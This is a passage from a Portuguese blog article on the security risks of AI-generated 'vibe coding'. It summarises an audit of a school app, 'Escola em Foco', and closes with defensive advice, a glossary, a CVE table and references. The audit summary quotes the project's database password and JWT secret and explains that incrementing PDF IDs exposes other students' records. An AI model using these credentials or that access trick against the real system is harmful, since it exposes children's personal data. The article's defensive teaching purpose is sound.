Nada disso é código da aplicação. É infraestrutura. E a IA gerando código React **não vai configurar seu Cloudflare WAF pra você**.

### Testes de Segurança Reais

Existe uma diferença enorme entre:

1. **Escrever código que parece seguro**
2. **Testar se o código é realmente seguro**

A IA faz o primeiro. Um pentest faz o segundo.

Um pentester (testador de penetração) vai:
- Tentar bypasses que você nem imaginou
- Combinar vulnerabilidades de formas criativas
- Usar ferramentas automatizadas E técnicas manuais
- Pensar como um atacante real pensa
- Testar em ambiente real, não só teoria

**Exemplo real**: O OWASP lista no [Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) mais de **90 categorias de testes** que deveriam ser feitos em uma aplicação web. Quantos desses você consegue cobrir via prompt?

### O custo real de "economizar" em segurança

Vou ser direto: segurança profissional custa dinheiro. Um pentest pode custar de R$ 10.000 a R$ 100.000+ dependendo do escopo. Um especialista em AppSec (Application Security) ganha bem. Ferramentas enterprise são caras.

Mas sabe o que custa mais?

- **Multas LGPD**: Até R$ 50 milhões por infração
- **Processo judicial**: Danos morais, materiais, coletivos
- **Recuperação de incidente**: Forensics, notificação, remediação
- **Perda de clientes**: Confiança quebrada não volta
- **Dano reputacional**: Google "vazamento de dados [empresa]" - fica pra sempre

Segundo o [IBM Cost of a Data Breach Report 2024](https://www.ibm.com/reports/data-breach), o custo médio de um vazamento de dados é de **$4.88 milhões de dólares** globalmente. No Brasil, a média é menor, mas ainda assim na casa dos milhões de reais.

Investir R$ 50.000 em segurança pra evitar um prejuízo de R$ 5.000.000 não é gasto - é seguro. É ROI positivo.

### Então não dá pra usar IA pra nada de segurança?

Dá sim. A IA é uma **ferramenta auxiliar** excelente:

- **Revisão de código**: "Olha esse código e me diz possíveis vulnerabilidades" - útil pra primeira triagem
- **Explicações didáticas**: "Explica como funciona CSRF e como prevenir" - ótimo pra aprender
- **Boilerplate seguro**: "Gera um template de autenticação com as melhores práticas" - bom ponto de partida
- **Automação de correções**: "Corrija essa vulnerabilidade de XSS" - acelera fixes conhecidos

O problema é usar IA como **substituto** de expertise, não como **complemento**.

### O que realmente funciona

Se você quer sistemas seguros de verdade, precisa combinar:

1. **Conhecimento**: Aprenda o básico (OWASP Top 10, pelo menos)
2. **Ferramentas automatizadas**: SAST, DAST, SCA - pegam o óbvio
3. **Revisão humana**: Code review focado em segurança
4. **Testes profissionais**: Pentest periódico, bug bounty
5. **Monitoramento**: Detectar e responder a incidentes
6. **Cultura**: Segurança como parte do processo, não afterthought

A IA pode ajudar em 1, 2 e 4. Mas não substitui nenhum.

E se você não tem budget pra tudo isso? Priorize. Comece pelo OWASP Top 10. Configure o Dependabot. Faça o básico bem feito. É melhor que nada - e infinitamente melhor que confiar cegamente em código gerado.

---

## O padrão que se repete

Lá no início do texto eu mostrei aquele ciclo típico do vibe coding: descreve, gera, "funcionou!", deploy, próxima feature. Agora que você viu todas essas vulnerabilidades, dá pra entender melhor por que esse ciclo é tão perigoso.

Cada uma das falhas que documentei aqui poderia ter sido evitada com uma simples pausa pra perguntar: "o que pode dar errado?". Mas essa pergunta nunca é feita porque quebra a "vibe". O momentum. A magia de ver código aparecendo na tela.

**O problema real não é a IA** - é a confiança cega. É achar que "funciona" significa "tá pronto". É a mentalidade de "depois eu arrumo" que nunca vira "agora".

As justificativas são sempre as mesmas:

- "A IA é inteligente, ela sabe o que tá fazendo" - Não sabe. Ela replica padrões de código de tutorial.
- "Vou arrumar depois" - Depois nunca chega quando a feature seguinte já tá chamando.
- "É só um MVP" - MVPs viram produtos. Muitas vezes os produtos estão com as mesmas falhas do MVP, então necessita cautela.
- "Meu projeto é pequeno, não interessa pra hackers" - Projetos pequenos podem ser alvos mais fáceis.

Essa última é a que mais me incomoda, por que sabe o que é mais irônico? Sabe qual é o alvo favorito de atacantes? **Projetos pequenos**. Porque é mais difícil de investir em segurança. Porque geralmente são mais fáceis de comprometer. Porque o dono acha que "não tem nada de valor" e nem monitora. Porque É O ALVO PERFEITO: vulnerável E desatento.

Sabe o que ainda piora a situação? projetos pequenos podem ter a capacidade de comprometer terceiros, pois viram trampolim pra ambientes maiores. Credenciais reutilizadas, acesso à rede interna, pivoting pra outros sistemas... aquele micro-SaaS que você fez no fim de semana pode ser a porta de entrada pro servidor de uma empresa grande sem nem perceber, a verdade é que você nem vai saber que foi usado como ponte. Muitas das invasões grandes que vemos por aí vieram de erro humano dos próprios funcionários, seja por phishing em e-mails, seja por... um sistema de uma pessoa que acreditou que iria fazer 20 mil reais de renda passiva com vibecoding e que reutilizou a mesma senha - na conta admin em produção - que usa no sistema da empresa que trabalha.

---

## Um resumo do estrago

Vou fazer um resumão do que encontramos no projeto **Escola em Foco**:

| O Que | Onde | Gravidade |
|-------|------|-----------|
| Login mock admin/admin | AuthContext.tsx | **Crítico** |
| Credenciais expostas NA PRÓPRIA TELA de login | Login.tsx | **Crítico** |
| JWT secret previsível | .env + auth.service.ts | **Crítico** |
| Fallback pra "default_secret" | auth.service.ts | **Crítico** |
| `.env` NÃO está no `.gitignore` | .gitignore | **Crítico** |
| Senha do banco exposta (gta123) | .env | **Crítico** |
| XSS via innerHTML (Stored XSS) | pdfGenerator.ts, componentes | **Crítico** |
| IDOR/BOLA em PDFs e recursos | URLs com IDs previsíveis | **Alto** |
| Senhas de seed triviais | auth.service.ts + seed-students.ts | **Alto** |
| Upload de imagem sem validação (logo + perfil) | SchoolSettingsTab.tsx, ProfileSettings | **Alto** |
| Cadeia de elevação de privilégio | localStorage → isAdmin | **Alto** |
| Dados sensíveis no localStorage | Vários arquivos | **Médio** |
| IDs previsíveis (timestamp + Math.random) | class.service.ts, attendance.service.ts | **Médio** |
| Zero validação/sanitização de inputs | Todo o projeto | **Médio** |
| 11 CVEs em dependências | package.json | **Variado** |

**Tempo de existência do projeto:** 7 meses

**Total de vulnerabilidades identificadas:** 26+ (11 CVEs + 15+ manuais)

**Verificações de segurança:** Zero (aparentemente)

**Tipo de dados:** Informações de crianças/estudantes

Isso é um projeto concreto... e que poderia estar rodando em uma escola real com dados reais de crianças reais.

---

## Como não cair nessa

### Pra quem desenvolve

**Primeira regra: nunca confie cegamente.** Código gerado por IA é um ponto de partida, não um produto final. Você precisa revisar, entender, e questionar cada linha... e é por isso que a área pode crescer ainda mais por conta dessa febre de vibe coding, vai ser tanta aplicação insegura que um profissional bom de segurança vai fazer a festa.

Perguntas que você deveria fazer:
- Tem credencial hardcoded aqui?
- Esse input está sendo validado?
- Esse dado deveria ser sanitizado antes de usar?
- Por que essa dependência? Preciso mesmo dela?
- E se um atacante mandar algo inesperado aqui?

**Segunda regra: automatize o que puder.** Configure o Dependabot no seu repositório. Rode `npm audit` antes de cada deploy. Use um linter de segurança. Não dependa da sua memória pra lembrar de verificar segurança.

```bash
# Antes de qualquer deploy
npm audit
# Se encontrar vulnerabilidades altas/críticas, resolva ANTES

# Ou configure no CI/CD pra falhar o build se tiver CVEs
```

**Terceira regra: nunca, jamais, em hipótese alguma...** commite secrets. Configure o `.env` no `.gitignore` desde o primeiro commit. Use ferramentas como git-secrets ou gitleaks pra impedir commits acidentais de credenciais.

**Checklist rápido antes do deploy:**

- [ ] `.env` está no `.gitignore`?
- [ ] Todas as senhas usam hash forte (bcrypt, argon2)?
- [ ] JWT secret é aleatório e está em variável de ambiente?
- [ ] Não tem fallback tipo `|| 'default_secret'`?
- [ ] Inputs são validados (tipo, tamanho, formato)?
- [ ] Dados são sanitizados antes de inserir em HTML?
- [ ] Rodei `npm audit` e não tem CVEs críticas?

### Pra Empresas

Se você está pensando em usar vibe coding ou plataformas no-code na sua empresa:

1. **Não use pra sistemas críticos.** Dados financeiros, saúde, informações de menores... não dá pra arriscar.

2. **Code review é obrigatório.** Especialmente se o código foi gerado por IA. Alguém que entende de segurança precisa olhar antes de ir pra produção.

3. **Tenha um pipeline de segurança.** Ferramentas automatizadas pegam boa parte dos problemas. SAST, DAST, SCA - siglas chatas, mas necessárias.

4. **Treine sua equipe.** Não precisa todo mundo ser especialista em segurança, mas todo mundo precisa saber o básico. OWASP Top 10 é um bom começo.

### Pra Quem Só Usa

Se você é usuário de uma plataforma que foi criada com vibe coding:

- Pergunte sobre segurança. A plataforma faz auditorias? Tem política de atualização?
- Não coloque dados super sensíveis até confiar no sistema
- Use senhas únicas (que você não usa em outros lugares)
- Monitore atividade e acessos

---

## Para Finalizar

Eu não escrevi esse artigo pra demonizar vibe coding ou IAs geradoras de código. Essas ferramentas são incríveis e democratizam o desenvolvimento de software. Mais gente pode criar coisas úteis, e isso é positivo.

Entretanto, segurança não pode ser sacrificada pela velocidade ou conveniência.

O caso do "Escola em Foco" é só mais um exemplo real do que acontece quando você confia cegamente em código gerado. Um sistema que lida com dados de crianças, com dezenas de vulnerabilidades silenciosas esperando pra serem exploradas.

É verdade que algumas coisas são claramente código de desenvolvimento. O login `admin/admin` com as credenciais na tela? Qualquer pessoa perceberia isso visualmente antes de mostrar pra alguém. O `.env` no repositório GitHub também segue a mesma lógica: o Lovable cria automaticamente um repositório no GitHub, e esse arquivo fica lá como parte do fluxo de desenvolvimento. A própria plataforma oferece um "Security Checker 2.0" que escaneia por "exposed secrets" e exibe avisos antes de publicar - então, em teoria, alguém atento removeria isso ou configuraria as variáveis no sistema de Secrets do Lovable Cloud antes de colocar em produção.

**Mas e o resto?**

As vulnerabilidades mais perigosas são justamente as que **não aparecem em nenhum scanner**. O JWT com secret previsível está no `.env`, sim - mas quem vai abrir esse arquivo e questionar se `"escola_em_foco_secret_key_2024"` é uma chave criptograficamente segura? O IDOR nos links de PDF passa completamente despercebido: o sistema funciona, os boletins são gerados, os usuários conseguem baixar seus documentos - ninguém percebe que incrementar um ID na URL dá acesso aos dados de outros alunos. O XSS via `innerHTML` no gerador de PDF nem aparece como erro: o código funciona perfeitamente, o PDF é gerado com o conteúdo renderizado, e o `dangerouslySetInnerHTML` faz exatamente o que o nome sugere sem que a IA questione. As 11 CVEs nas dependências? O Dependabot avisa, mas quem não sabe o que é Dependabot nem configura as notificações - os alertas ficam lá, ignorados, enquanto as vulnerabilidades permanecem no código. E o `localStorage` com dados sensíveis? É assim que a maioria dos tutoriais ensina, então parece certo.

Essas são as falhas que vão pra produção porque **ninguém sabe que estão lá**. O código funciona, a aplicação roda, os usuários usam - e as vulnerabilidades ficam dormentes, esperando alguém descobrir. O próprio Lovable reconhece isso na documentação: *"seeing no warnings from the security scanner does not guarantee that there are no security issues in your app"*. E esse é exatamente o ponto: você pode usar todas as ferramentas disponíveis e ainda assim ter falhas que nenhuma delas detecta.

A IA é uma ferramenta. Culpar ela por código inseguro é como culpar o martelo por pregar torto. O problema somos nós - que não revisamos, não testamos, não questionamos. Que aceitamos o "funcionou" como sinônimo de "tá pronto".

Dá pra usar essas ferramentas de forma responsável:

- Use pra protótipos e MVPs
- Revise antes de ir pra produção
- Automatize verificações de segurança
- Aprenda pelo menos o básico de segurança web
- E principalmente: tenha humildade pra reconhecer que você não sabe o que não sabe

"Move fast and break things" é um mantra bonito. Mas quando as "things" que você quebra são dados de crianças, prontuários médicos ou sistemas financeiros, as consequências são muito reais e isso pode quebrar sua empresa.

Vibe coding é divertido. Ver código aparecendo "magicamente", transformando meses de trabalho em minutos na sua tela, é empolgante. Mas toda mágica tem um preço - e em segurança da informação, quem paga a conta geralmente são os usuários finais que confiaram seus dados à sua empresa.

Então, se mesmo fazendo tudo certo ainda há chance de uma falha existir e os dados vazarem, usar ferramentas de IA com responsabilidade PRECISA ser uma política SÉRIA.

---

## Glossário de Termos

Pra facilitar a leitura, especialmente pra quem não é da área técnica:

### Siglas de Segurança

| Termo | Significado | Explicação Simples |
|-------|-------------|---------------------|
| **CVE** | Common Vulnerabilities and Exposures | "RG" de uma vulnerabilidade - identificador único global |
| **CWE** | Common Weakness Enumeration | Categoria/tipo de fraqueza (ex: "validação incorreta") |
| **CVSS** | Common Vulnerability Scoring System | Nota de 0-10 que indica a gravidade |
| **XSS** | Cross-Site Scripting | Injeção de código malicioso em páginas web |
| **IDOR** | Insecure Direct Object Reference | Acessar dados de outros usuários mudando IDs |
| **BOLA** | Broken Object Level Authorization | Mesmo que IDOR, termo usado em APIs |
| **DoS** | Denial of Service | Ataque que trava/derruba o sistema |
| **RCE** | Remote Code Execution | Executar código malicioso no servidor |
| **JWT** | JSON Web Token | "Crachá digital" usado pra autenticação |
| **CSP** | Content Security Policy | Configuração que bloqueia scripts não autorizados |
| **CORS** | Cross-Origin Resource Sharing | Controle de quem pode acessar sua API |

### Termos de Desenvolvimento

| Termo | Explicação Simples |
|-------|---------------------|
| **Dependência** | Biblioteca/código de terceiros que seu projeto usa |
| **Supply Chain** | Cadeia de fornecimento - todas as dependências do projeto |
| **Sanitização** | Limpar/filtrar dados pra remover código malicioso |
| **Hash** | Transformação irreversível (usada pra senhas) |
| **Token** | Código temporário que prova sua identidade |
| **localStorage** | Armazenamento do navegador - vulnerável a XSS |
| **Rate Limiting** | Limitar quantas requisições por tempo |
| **Mock** | Dados falsos usados pra testes |
| **Seed** | Popular banco de dados com dados iniciais |
| **CI/CD** | Sistemas que fazem build/deploy automático |

---

## Referências e Links Úteis

### CVEs Mencionadas

| CVE | Pacote | Tipo | CWE | CVSS | Patch |
|-----|--------|------|-----|------|-------|
| CVE-2025-57810 | jsPDF | DoS via PNG | CWE-20, CWE-835 | 8.7 (v4) | ≥3.0.2 |
| CVE-2025-64756 | glob | Command Injection | CWE-78 | 7.5 (v3.1) | 10.5.0 ou 11.1.0 |
| CVE-2025-65945 | jws | HMAC Bypass | CWE-347 | 7.5 (v3.1) | 3.2.3 ou 4.0.1 |
| CVE-2025-62522 | Vite | Path Traversal (Windows) | CWE-22 | 6.3 (v4) | ≥6.4.1 |
| CVE-2025-64718 | js-yaml | Prototype Pollution | CWE-1321 | 5.3 (v3.1) | 4.1.1 ou 3.14.2 |
| CVE-2025-58751 | Vite | Symlink Bypass | CWE-22, CWE-200, CWE-284 | LOW | ≥6.3.6 |
| CVE-2025-58752 | Vite | HTML Bypass | CWE-23, CWE-200, CWE-284 | LOW | ≥6.3.6 |

### Para Estudar Mais

#### Pesquisas acadêmicas sobre segurança em código gerado por IA

- **"Asleep at the Keyboard?"** (Pearce et al., IEEE S&P 2022) - Estudo clássico que analisou 1.689 programas gerados pelo GitHub Copilot e encontrou que **aproximadamente 40% continham vulnerabilidades**. Disponível em [arXiv:2108.09293](https://arxiv.org/abs/2108.09293)
- **"Vibe Coding in Practice"** (Waseem et al., 2025) - Análise de débito técnico e guidelines para uso sustentável. [arXiv:2512.11922](https://arxiv.org/abs/2512.11922)
- **"Security Vulnerabilities in AI-Generated Code"** (Schreiber & Tippe, 2025) - Análise empírica de vulnerabilidades em repositórios públicos do GitHub. [arXiv:2510.26103](https://arxiv.org/abs/2510.26103)
- **"Taught by the Flawed"** (Xia & Alalfi, 2025) - Como datasets inseguros geram código vulnerável. [arXiv:2511.09879](https://arxiv.org/abs/2511.09879)
- **"When AI Takes the Wheel"** (Liu et al., 2025) - Análise de segurança em geração de código com frameworks. [arXiv:2510.16823](https://arxiv.org/abs/2510.16823)

#### Recursos de Segurança

- [OWASP Top 10](https://owasp.org/www-project-top-ten/) - As 10 vulnerabilidades mais comuns em aplicações web
- [OWASP API Security Top 10](https://owasp.org/API-Security/editions/2023/en/0x11-t10/) - Incluindo BOLA (#1) que discutimos neste artigo
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/) - Guias práticos de segurança
- [Hacking Club](https://hackingclub.com/) - Cursos de segurança brasileiro com máquinas e laboratórios de casos reais
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) - Aprenda hacking web de graça
- [Snyk Learn](https://learn.snyk.io/) - Aprenda segurança de forma gratuita

### Ferramentas

- **Dependabot** - Alertas automáticos de CVEs no GitHub
- **Snyk** - Scanner de vulnerabilidades (código + dependências)
- **npm audit** - Verificação básica de dependências
- **git-secrets** - Impede commit de credenciais

---

*Se você leu até aqui, agora sabe mais sobre segurança em vibe coding do que a maioria das pessoas que usam essas ferramentas. Use esse conhecimento pra construir coisas melhores.*

**Gostou desse conteúdo?** Compartilhe com quem está começando a programar ou pensando em usar plataformas no-code/low-code. Um link compartilhado pode evitar um vazamento de dados.

**Quer se aprofundar em segurança?** Confira os recursos listados acima - especialmente o OWASP Top 10 e a Web Security Academy do PortSwigger. São gratuitos e vão te dar uma base sólida.

**Encontrou algum erro ou quer contribuir?** Este blog é open source. Sinta-se à vontade pra comentar abaixo com sua conta do GitHub, abrir uma issue ou PR por lá.

*Stay safe, code responsibly.* 🔒
